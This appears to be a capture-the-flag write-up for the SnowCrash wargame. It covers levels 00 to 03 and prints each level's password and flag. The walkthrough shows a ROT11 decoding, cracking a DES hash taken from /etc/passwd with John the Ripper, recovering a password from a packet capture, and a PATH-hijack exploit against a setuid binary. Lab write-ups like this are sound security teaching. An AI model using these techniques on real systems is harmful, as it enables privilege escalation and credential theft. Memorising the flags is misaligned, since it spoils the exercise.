# snowcrash-writeup
This project aims to make you discover, through several little challenges, cyber security in various fields.

## Level00:

```bash
level00@SnowCrash:~$ ls -l /usr/sbin/ | grep flag00
----r--r--  1 flag00  flag00      15 Mar  5  2016 john
```
```bash
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
level00@SnowCrash:~$
```
ROT11: 

<img width="489" alt="image" src="https://user-images.githubusercontent.com/48088579/148955037-fe8cbff0-538f-4c38-b254-9c58efa00a20.png">

Password for flag00: `nottoohardhere`

Flag: `x24ti5gi3x0ol2eh4esiuxias`

## Level01:

```bash
level01@SnowCrash:~$ cat /etc/passwd
...
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
...
```
```bash
➜  ~ echo "42hDRfypTqqnw" > hash && john hash
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (?)
1g 0:00:00:00 100% 2/3 33.33g/s 25600p/s 25600c/s 25600C/s raquel..bigman
Use the "--show" option to display all of the cracked passwords reliably
Session completed
➜  ~
```

Password for flag01: `abcdefg`

Flag: `f2av5il02puano7naaf6adaaf`

## Level02:
```bash
level02@SnowCrash:~$ ls -l
total 12
----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
level02@SnowCrash:~$
```

TCP Stream:

<img width="691" alt="image" src="https://user-images.githubusercontent.com/48088579/148960536-2c6ce7ee-c4f2-4c5a-a2b9-9eceafa8bb38.png">

Password as Hex:

```
66
74
5f
77
61
6e
64
72
7f
7f
7f
4e
44
52
65
6c
7f
4c
30
4c
0d
```

Filtering the password: if `7f` is `DEL` and `0D` is `CR` the password will be `66 74 5F 77 61 4E 44 52 65 4C 30 4C`.

Password for flag02: `ft_waNDReL0L`

Flag: `kooda2puivaav1idi4f57q8iq`

## Level03:

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$
```

Disassembled:

<img width="468" alt="image" src="https://user-images.githubusercontent.com/48088579/148961769-ff778941-e677-4280-b940-a7ffee264ccb.png">

Exploit:

```bash
echo "/bin/bash" > /tmp/echo && chmod 777 /tmp/echo && export PATH=/tmp:$PATH && ./level03
```

Flag: qi0maab88jeaj46qoumi7maus
